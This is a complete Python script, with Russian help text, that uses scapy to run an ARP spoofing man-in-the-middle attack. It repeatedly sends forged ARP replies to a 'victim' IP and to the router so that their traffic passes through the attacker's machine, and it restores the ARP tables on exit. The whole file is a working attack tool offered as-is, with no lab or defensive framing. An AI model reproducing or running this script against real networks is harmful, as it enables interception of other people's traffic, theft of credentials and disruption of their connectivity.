import scapy.all as scapy
import time
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("--target", help="Установить IP жертвы")
parser.add_argument("--spoof_ip", help="IP роутера")

args = parser.parse_args()

target = args.target
spoof_ip = args.spoof_ip



def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    request = broadcast/arp_request
    answered = scapy.srp(request, timeout=1, verbose=False)[0]
    result = None
    for packet in answered:
        result = packet[1].src
    if result:
        return result
    else:
        return -1

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    router_mac = get_mac(spoof_ip)
    print(target_mac)
    print(router_mac)
    arp_packet_victim = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
    scapy.send(arp_packet_victim, verbose=False)
    arp_packet_router = scapy.ARP(op=2, psrc=target_ip, pdst=spoof_ip, hwdst=router_mac)
    scapy.send(arp_packet_router, verbose=False)
    print("Successefull sent packet")

def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    packet = scapy.ARP(op=2, psrc=src_ip, pdst=dst_ip, hwdst=dst_mac, hwsrc=get_mac(src_ip))
    scapy.send(packet, count=4, verbose=False)



try:
    while True:
        spoof(target, spoof_ip)
        time.sleep(1)
except KeyboardInterrupt:
    print("Exiting... Restoring MAC tables...")
    restore(target, spoof_ip)
    restore(spoof_ip, target)
except TypeError:
    print("Устройство отключено от сети!")